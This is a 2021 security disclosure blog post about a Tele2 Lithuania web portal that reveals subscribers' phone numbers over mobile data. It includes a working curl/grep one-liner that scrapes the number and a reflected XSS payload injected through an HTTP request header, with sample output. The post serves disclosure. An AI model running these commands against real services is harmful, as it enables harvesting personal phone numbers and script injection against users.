---
title: "Tele2 is leaking our phone numbers (Lithuania)"
date: 2021-02-01T14:37:00+00:00
author: "Stnby"
---

## Quick story
About a year ago I had found this *design feature*.

If you go to http://narsyk.tele2.lt/ while on mobile data it displays how much mobile data you have left and most importantly your own phone number.

After a [scandal](https://blog.devsecurity.eu/en/blog/mobile-data-leak) by another security researcher from Lithuania.\
**Tele2** and most other providers *fixed* this *design feature* (they even replaced the large part of the phone number inside http://narsyk.tele2.lt/).

But the *funny* thing is that **they reverted this fix and the phone number is being displayed like it always has been**.

{{< figure src="2021-02-01_11-56.png" title="Phone number in the top right corner" >}}

## How is this an issue?
From **personal data mining** scenarios to **phishing**.

Well any application running on your phone or anything else connected to your hotspot can get your phone number.

## Simple demo
A simple POSIX Shell one-liner.
```sh
#!/bin/sh
curl -s -L -b none 'http://narsyk.tele2.lt/' | grep -Po '<p>\K[[:digit:]]*' | sed 's/^/+370/'
```

```
$ ./tele2.sh
+3706******7
```

## Bonus content
Well if you access that same site while on Wi-Fi.\
You can cause XSS via **HTTP Request Header** manipulation.

```sh
curl -s -L -H 'X-Tele2-Subid: <script>alert("XSS");</script>' 'http://narsyk.tele2.lt/'
```

```html
...
<!-- Content-->
<div class="main">
    <div class="alert">
        Jūs esate prisijungę prie WIFI ryšio (IP <script>alert("XSS");</script>). Šis puslapis veikia naudojantis tik TELE2 mobiliuoju internetu.&nbsp;<br />
Išjunkite WIFI ir perkraukite puslapį.&nbsp;Naršymas nemokamas.
    </div>
</div>
...
```

{{< figure src="2021-02-01_14-30.png" title="Fairly useless XSS" >}}
It is a low risk XSS (and basically useless) but whatever it's *still funny*.
